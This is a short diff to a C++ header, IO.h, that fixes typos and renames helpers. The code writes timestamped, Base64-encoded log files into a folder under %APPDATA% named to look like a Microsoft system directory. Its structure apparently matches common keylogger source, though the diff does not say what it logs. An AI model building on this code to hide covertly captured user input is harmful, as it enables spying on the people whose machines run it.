@@ -1,19 +1,20 @@
 #ifndef IO_H
-#define IO
+#define IO_H
 
-#include "Helper.h"
-#include "Base64.h"
+#include "General.h"
+#include "Encrypt.h"
 #include "windows.h"
 #include <string>
 #include <cstdlib>
+#include <fstream>
 
 namespace IO
 {
-    std::string GetOurPath(const bool append_seperatator = false)
+    std::string GetOurPath(const bool append_seperator = false)
     {
         std::string appdata_dir(getenv("APPDATA"));
         std::string full = appdata_dir + "\\Microsoft\\CLR";
-        return full + (append_seperarator ? "\\" : "");
+        return full + (append_seperator ? "\\" : "");
     }
 
     bool MkDir(std::string path)
@@ -38,10 +39,10 @@ namespace IO
     }
 
     template <class T>
-    std::string GenerateAppLog(const T &t)
+    std::string GenerateLog(const T &t)
     {
-        std:string path = GetOurPath(true);
-        Helper::DateTime dt;
+        std::string path = GetOurPath(true);
+        General::DateTime dt;
         std::string name = dt.GetDateTimeString("_") + ".log";
 
         try
@@ -51,7 +52,7 @@ namespace IO
             std::ostringstream s;
             s << "[" << dt.GetDateTimeString() << "]" <<
             std::endl << t << std::endl;
-            std::string:: data = Base64::Encrypt(s.str());
+            std::string data = Base_64::Encrypt(s.str());
             file << data;
             if(!file)
                 return "";
